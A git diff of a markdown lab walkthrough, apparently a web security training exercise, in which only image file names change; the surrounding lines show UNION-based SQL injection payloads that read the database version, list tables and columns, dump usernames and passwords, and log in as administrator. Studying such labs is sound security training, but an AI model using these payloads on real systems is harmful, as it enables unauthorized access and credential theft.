@@ -94,7 +94,7 @@ Use the following payload to display the database version:
 'UNION SELECT version(),'b'--
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use the following payload to retrieve the list of tables in the database:
 
@@ -102,7 +102,7 @@ Use the following payload to retrieve the list of tables in the database:
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
 
@@ -110,7 +110,7 @@ Use the following payload (replacing the table name) to retrieve the details of 
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_pferxc'--
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
 
@@ -118,7 +118,7 @@ Use the following payload (replacing the table and column names) to retrieve the
 ' UNION SELECT username_govtqv,password_hcvbes FROM users_pferxc--
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Find the password for the `administrator` user, and use it to log in.
 
